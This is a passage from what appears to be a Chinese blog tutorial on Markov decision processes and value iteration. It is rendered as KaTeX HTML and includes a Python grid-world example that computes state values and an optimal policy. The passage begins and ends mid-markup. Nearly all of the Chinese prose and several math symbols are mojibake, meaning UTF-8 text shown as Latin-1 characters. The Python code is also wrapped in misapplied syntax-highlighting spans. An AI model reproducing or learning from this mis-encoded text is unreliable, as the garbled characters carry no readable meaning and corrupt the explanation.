xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>é‡‡å–åŠ¨ä½œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>åè½¬ç§»åˆ°çŠ¶æ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>â€²</mtext></mrow><annotation encoding="application/x-tex">sâ€²</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">â€²</span></span></span></span></span>çš„æ¦‚ç‡åˆ†å¸ƒï¼Œç”¨äºå»ºæ¨¡ç¯å¢ƒçš„éšæœºæ€§ã€‚</li>
<li>å¥–åŠ±å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><mi>s</mi><mtext>â€²</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(s,a,sâ€²)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">s</span><span class="mord">â€²</span><span class="mclose">)</span></span></span></span></span>ï¼šè¡¨ç¤ºæ™ºèƒ½ä½“åœ¨çŠ¶æ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>æ‰§è¡ŒåŠ¨ä½œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>å¹¶è½¬ç§»åˆ°çŠ¶æ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>â€²</mtext></mrow><annotation encoding="application/x-tex">sâ€²</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">â€²</span></span></span></span></span>æ—¶è·å¾—çš„å³æ—¶åé¦ˆï¼ŒæŒ‡å¯¼æ™ºèƒ½ä½“é€‰æ‹©æ›´ä¼˜ç­–ç•¥ã€‚</li>
<li>æŠ˜æ‰£å› å­ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î³</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Î³âˆˆ[0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>ï¼šç”¨äºè®¡ç®—ç´¯è®¡å¥–åŠ±çš„æŠ˜æ‰£ï¼Œä½¿å¾—æ™ºèƒ½ä½“åœ¨åšå†³ç­–æ—¶å¹³è¡¡çŸ­æœŸå¥–åŠ±å’Œé•¿æœŸæ”¶ç›Šã€‚</li>
</ol>
<p>MDP çš„æ ¸å¿ƒé—®é¢˜æ˜¯æ‰¾åˆ°ä¸€ä¸ªæœ€ä¼˜ç­–ç•¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Ï€</mi><mo>âˆ—</mo></msup></mrow><annotation encoding="application/x-tex">\pi^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6887em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span></span></span></span></span>ï¼Œä½¿æ™ºèƒ½ä½“åœ¨ç¯å¢ƒä¸­é‡‡å–ç­–ç•¥åè·å¾—çš„ æœŸæœ›ç´¯è®¡å¥–åŠ±æœ€å¤§åŒ–ã€‚ç­–ç•¥<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï€</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex"> Ï€(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>å®šä¹‰äº†åœ¨æ¯ä¸ªçŠ¶æ€ä¸‹é€‰æ‹©åŠ¨ä½œçš„è§„åˆ™ã€‚</p>
<p>è§£å†³ MDP çš„å¸¸ç”¨æ–¹æ³•åŒ…æ‹¬ï¼š</p>
<ol>
<li>åŠ¨æ€è§„åˆ’ï¼ˆDynamic Programming, DPï¼‰</li>
</ol>
<p>é€šè¿‡è´å°”æ›¼æ–¹ç¨‹ï¼ˆBellman Equationï¼‰è¿­ä»£æ±‚è§£çŠ¶æ€å€¼å‡½æ•° V(s) æˆ–åŠ¨ä½œå€¼å‡½æ•° Q(s,a)ï¼Œé€æ­¥æ›´æ–°ç­–ç•¥ï¼Œç›´è‡³æ”¶æ•›åˆ°æœ€ä¼˜ç­–ç•¥ã€‚</p>
<ol start="2">
<li>å€¼è¿­ä»£ï¼ˆValue Iterationï¼‰ä¸ç­–ç•¥è¿­ä»£ï¼ˆPolicy Iterationï¼‰</li>
</ol>
<ul>
<li>å€¼è¿­ä»£ç›´æ¥è¿­ä»£æ›´æ–°å€¼å‡½æ•°ï¼Œæœ€ç»ˆæ ¹æ®å€¼å‡½æ•°å¯¼å‡ºæœ€ä¼˜ç­–ç•¥ã€‚</li>
<li>ç­–ç•¥è¿­ä»£äº¤æ›¿è¿›è¡Œç­–ç•¥è¯„ä¼°å’Œç­–ç•¥æ”¹è¿›ï¼Œç›´åˆ°ç­–ç•¥ä¸å†æ”¹å˜ï¼Œå¾—åˆ°æœ€ä¼˜ç­–ç•¥ã€‚</li>
</ul>
<ol start="3">
<li>å¼ºåŒ–å­¦ä¹ æ–¹æ³•</li>
</ol>
<p>å½“ç¯å¢ƒçš„çŠ¶æ€è½¬ç§»æ¦‚ç‡å’Œå¥–åŠ±å‡½æ•°æœªçŸ¥æ—¶ï¼Œå¯é€šè¿‡äº¤äº’å¼å­¦ä¹ æ–¹æ³•ï¼ˆå¦‚ Q-learningã€SARSAï¼‰ä¼°è®¡å€¼å‡½æ•°ï¼Œé€æ­¥é€¼è¿‘æœ€ä¼˜ç­–ç•¥ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä»£ç æ¼”ç¤ºå¦‚ä½•åœ¨ä¸€ä¸ªå°å‹ MDP ä¸Šä½¿ç”¨ å€¼è¿­ä»£ï¼ˆValue Iterationï¼‰ æ±‚è§£æœ€ä¼˜ç­–ç•¥ï¼Œä¸ºäº†ç›´è§‚å±•ç¤ºï¼Œæˆ‘ç”¨ä¸€ä¸ªç®€å•çš„ç½‘æ ¼ä¸–ç•Œï¼ˆGrid Worldï¼‰ç¯å¢ƒï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt

<span class="hljs-comment"># 1. ç½‘æ ¼ä¸–ç•Œå‚æ•°</span>
n_rows, <span class="hljs-attr">n_cols</span> = <span class="hljs-number">4</span>, <span class="hljs-number">4</span>
<span class="hljs-attr">n_states</span> = n_rows * n_cols
<span class="hljs-attr">n_actions</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># ä¸Š,ä¸‹,å·¦,å³</span>

<span class="hljs-attr">action_offsets</span> = [(-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]
<span class="hljs-attr">action_symbols</span> = [<span class="hljs-string">'â†‘'</span>,<span class="hljs-string">'â†“'</span>,<span class="hljs-string">'â†'</span>,<span class="hljs-string">'â†’'</span>]

<span class="hljs-attr">start_state</span> = <span class="hljs-number">0</span>       <span class="hljs-comment"># å·¦ä¸Šè§’ S</span>
<span class="hljs-attr">terminal_state</span> = n_states - <span class="hljs-number">1</span>  <span class="hljs-comment"># å³ä¸‹è§’ T</span>
<span class="hljs-attr">reward_step</span> = -<span class="hljs-number">1</span>
<span class="hljs-attr">reward_terminal</span> = <span class="hljs-number">0</span>

<span class="hljs-comment"># çŠ¶æ€è½¬ç§»å‡½æ•°</span>
def next_state_reward(s, a):
    row, <span class="hljs-attr">col</span> = divmod(s, n_cols)
    if <span class="hljs-attr">s</span> == terminal_state:
        return s, reward_terminal
    dr, <span class="hljs-attr">dc</span> = action_<span class="hljs-literal">off</span>sets[a]
    <span class="hljs-attr">new_row</span> = min(max(row+dr,<span class="hljs-number">0</span>), n_rows-<span class="hljs-number">1</span>)
    <span class="hljs-attr">new_col</span> = min(max(col+dc,<span class="hljs-number">0</span>), n_cols-<span class="hljs-number">1</span>)
    <span class="hljs-attr">s_next</span> = new_row * n_cols + new_col
    return s_next, reward_step

<span class="hljs-comment"># 2. å€¼è¿­ä»£</span>
<span class="hljs-attr">gamma</span> = <span class="hljs-number">0.9</span>
<span class="hljs-attr">theta</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>
<span class="hljs-attr">V</span> = np.zeros(n_states)

while True:
    <span class="hljs-attr">delta</span> = <span class="hljs-number">0</span>
    for s in range(n_states):
        if <span class="hljs-attr">s</span> == terminal_state:
            continue
        <span class="hljs-attr">v</span> = V[s]
        V<span class="hljs-section">[s]</span> = max(<span class="hljs-section">[next_state_reward(s,a)[1]</span> + gamma*V<span class="hljs-section">[next_state_reward(s,a)[0]]</span> for a in range(n_actions)])
        <span class="hljs-attr">delta</span> = max(delta, abs(v-V[s]))
    if delta &lt; theta:
        break

<span class="hljs-comment"># 3. æ±‚æœ€ä¼˜ç­–ç•¥</span>
<span class="hljs-attr">policy</span> = np.full(n_states,<span class="hljs-string">''</span>,dtype=object)
for s in range(n_states):
    if <span class="hljs-attr">s</span> == start_state:
        policy<span class="hljs-section">[s]</span> = 'S'
    elif <span class="hljs-attr">s</span> == terminal_state:
        policy<span class="hljs-section">[s]</span> = 'T'
    else:
        <span class="hljs-attr">q_values</span> = [next_state_reward(s,a)[<span class="hljs-number">1</span>] + gamma*V[next_state_reward(s,a)[<span class="hljs-number">0</span>]] for a in range(n_actions)]
        policy<span class="hljs-section">[s]</span> = action_symbols<span class="hljs-section">[np.argmax(q_values)]</span>

<span class="hljs-attr">grid_policy</span> = policy.reshape(n_rows, n_cols)
print("æœ€ä¼˜ç­–ç•¥ï¼š")
print(grid_policy)

<span class="hljs-comment"># 4. å¯è§†åŒ–å€¼å‡½æ•°å’Œç­–ç•¥</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))
plt.imshow(V.reshape(n_rows, n_cols), <span class="hljs-attr">cmap</span>=<span class="hljs-string">'cool'</span>, interpolation=<span class="hljs-string">'nearest'</span>)
for i in range(n_rows):
    for j in range(n_cols):
        plt.text(j,i,f"{V<span class="hljs-section">[i*n_cols+j]</span>:.1f}\n{grid_policy<span class="hljs-section">[i,j]</span>}",<span class="hljs-attr">ha</span>=<span class="hljs-string">'center'</span>,va=<span class="hljs-string">'center'</span>,color=<span class="hljs-string">'black'</span>)
plt.title("Grid World: State Values and Optimal Policy")
plt.colorbar(<span class="hljs-attr">label</span>=<span class="hljs-string">"Value"</span>)
plt.show()
</code></pre>
<p>è¿è¡Œç»“æœå¦‚ä¸‹å›¾ï¼Œå…¶ä¸­è¾“å‡ºç½‘æ ¼ä¸­æ¯ä¸ªçŠ¶æ€å¯¹åº”çš„æœ€ä¼˜åŠ¨ä½œï¼ˆâ†‘â†“â†â†’ï¼‰ï¼Œç»ˆç‚¹ç”¨ T æ ‡è®°ã€‚é¢œè‰²è¶Šæ·±è¡¨ç¤ºçŠ¶æ€ä»·å€¼è¶Šé«˜ï¼Œå›¾ä¸ŠåŒæ—¶æ ‡å‡ºæœ€ä¼˜ç­–ç•¥ï¼Œå¯ä»¥ç›´è§‚çœ‹åˆ°æ™ºèƒ½ä½“å¦‚ä½•ä»å·¦ä¸Šè§’èµ°å‘å³ä¸‹è§’ç»ˆç‚¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ef8804690d849acbce83460ab7310b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529615&amp;x-signature=TjYy9nXiry42OCg4hAwRBa43Ajo%3D" alt="" loading="lazy"/></p>
<p>MDP åœ¨å¼ºåŒ–å­¦ä¹ å’Œå†³ç­–é—®é¢˜ä¸­åº”ç”¨å¹¿æ³›ã€‚ä¾‹å¦‚ï¼Œæœºå™¨äººæ§åˆ¶ä»»åŠ¡ä¸­ï¼ŒçŠ¶æ€è¡¨ç¤ºæœºå™¨äººçš„ä½ç½®å’Œå§¿æ€ï¼ŒåŠ¨ä½œè¡¨ç¤ºå¯æ‰§è¡Œçš„æ§åˆ¶å‘½ä»¤ï¼›åœ¨èµ„æºè°ƒåº¦é—®é¢˜ä¸­ï¼ŒçŠ¶æ€è¡¨ç¤ºç³»ç»Ÿèµ„æºä½¿ç”¨æƒ…å†µï¼ŒåŠ¨ä½œè¡¨ç¤ºä»»åŠ¡åˆ†é…ç­–ç•¥ï¼›åœ¨æ¸¸æˆ AI ä¸­ï¼ŒçŠ¶æ€è¡¨ç¤ºæ¸¸æˆæ£‹ç›˜æˆ–åœºæ™¯ä¿¡æ¯ï¼ŒåŠ¨ä½œè¡¨ç¤ºç©å®¶å¯èƒ½é‡‡å–çš„æ“ä½œã€‚é€šè¿‡å°†è¿™äº›é—®é¢˜å»ºæ¨¡ä¸º MDPï¼Œå¯ä»¥ç³»ç»Ÿæ€§åœ°æ±‚è§£æœ€ä¼˜ç­–ç•¥ï¼Œå®ç°æ™ºèƒ½ä½“è‡ªä¸»å†³ç­–å’Œé•¿æœŸæ”¶ç›Šæœ€å¤§åŒ–ã€‚</p>
<p>é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹æä¾›äº†ä¸€ä¸ªç»“æ„åŒ–çš„æ•°å­¦æ¡†æ¶ï¼Œå°†åºåˆ—å†³ç­–é—®é¢˜å½¢å¼åŒ–ä¸ºçŠ¶æ€ã€åŠ¨ä½œã€å¥–åŠ±å’Œè½¬ç§»æ¦‚ç‡çš„ç»„åˆã€‚é€šè¿‡åŠ¨æ€è§„åˆ’ã€å€¼è¿­ä»£ã€ç­–ç•¥è¿­ä»£ä»¥åŠå¼ºåŒ–å­¦ä¹ æ–¹æ³•ï¼ŒMDP å¯ä»¥å¸®åŠ©æ™ºèƒ½ä½“åœ¨ä¸ç¡®å®šç¯å¢ƒä¸­å­¦ä¹ æœ€ä¼˜ç­–ç•¥ã€‚ä½œä¸ºå¼ºåŒ–å­¦ä¹ çš„ç†è®ºåŸºç¡€ï¼ŒMDP ä¸ä»…åœ¨å­¦æœ¯ç ”ç©¶ä¸­å…·æœ‰é‡è¦æ„ä¹‰ï¼Œä¹Ÿåœ¨æœºå™¨äººã€æ¸¸æˆã€è°ƒåº¦å’Œè‡ªåŠ¨é©¾é©¶ç­‰å®é™…åº”ç”¨ä¸­å±•ç°å‡ºå¼ºå¤§çš„ä»·å€¼ã€‚</p>
<h3 data-id="heading-2">åŠ¨æ€è§„åˆ’ä¸å€¼è¿­ä»£</h3>
<p>åœ¨å¼ºåŒ–å­¦ä¹ ä¸­ï¼ŒåŠ¨æ€è§„åˆ’ï¼ˆDynamic Programming, DPï¼‰ æ˜¯æ±‚è§£å†³ç­–é—®é¢˜çš„ä¸€ç§ç»å…¸æ–¹æ³•ï¼Œå®ƒå‡è®¾ç¯å¢ƒçš„çŠ¶æ€è½¬ç§»æ¦‚ç‡å’Œå¥–åŠ±å‡½æ•°å·²çŸ¥ï¼Œé€šè¿‡ç³»ç»Ÿåœ°åˆ†è§£é—®é¢˜ã€åˆ©ç”¨æœ€ä¼˜å­ç»“æ„ç‰¹æ€§æ±‚è§£æœ€ä¼˜ç­–ç•¥ã€‚</p>
<p>å€¼è¿­ä»£ï¼ˆValue Iterationï¼‰æ˜¯åŠ¨æ€è§„åˆ’ä¸­æœ€å¸¸ç”¨çš„ä¸€ç§ç®—æ³•ï¼Œèƒ½å¤Ÿé«˜æ•ˆåœ°è®¡ç®—é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹ï¼ˆMDPï¼‰ä¸­çš„æœ€ä¼˜çŠ¶æ€ä»·å€¼å‡½æ•°ï¼Œä»è€Œå¯¼å‡ºæœ€ä¼˜ç­–ç•¥ã€‚</p>
<p>åŠ¨æ€è§„åˆ’çš„æ ¸å¿ƒæ€æƒ³æ˜¯ å°†å¤æ‚çš„å†³ç­–é—®é¢˜æ‹†è§£æˆå­é—®é¢˜ï¼Œå¹¶é€šè¿‡å·²è§£å†³çš„å­é—®é¢˜ç»“æœæ¥æ±‚è§£æ•´ä½“é—®é¢˜ã€‚å¯¹äºå¼ºåŒ–å­¦ä¹ ä¸­çš„ MDPï¼ˆMarkov Decision Processï¼‰ï¼ŒåŠ¨æ€è§„åˆ’çš„ç›®æ ‡æ˜¯è®¡ç®—æ¯ä¸ªçŠ¶æ€çš„æœ€ä¼˜ä»·å€¼å‡½æ•°<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V^*(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>ã€‚</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mrow><mi>max</mi><mo>â¡</mo></mrow><mi>a</mi></msub><msub><mo>âˆ‘</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></msub><mi>P</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mi mathvariant="normal">âˆ£</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mo>+</mo><mi>Î³</mi><msup><mi>V</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">V^*(s) = \max_a \sum_{s'} P(s'|s,a) \big[ R(s,a,s') + \gamma V^*(s') \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1783em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></p>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>è¡¨ç¤ºå½“å‰çŠ¶æ€</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>è¡¨ç¤ºåŠ¨ä½œ</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>â€²</mtext></mrow><annotation encoding="application/x-tex">sâ€²</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">â€²</span></span></span></span></span>è¡¨ç¤ºä¸‹ä¸€çŠ¶æ€</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>s</mi><mtext>â€²</mtext><mo>âˆ£</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(sâ€²âˆ£s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord">â€²</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span>ä¸ºçŠ¶æ€è½¬ç§»æ¦‚ç‡</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><mi>s</mi><mtext>â€²</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(s,a,sâ€²)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">s</span><span class="mord">â€²</span><span 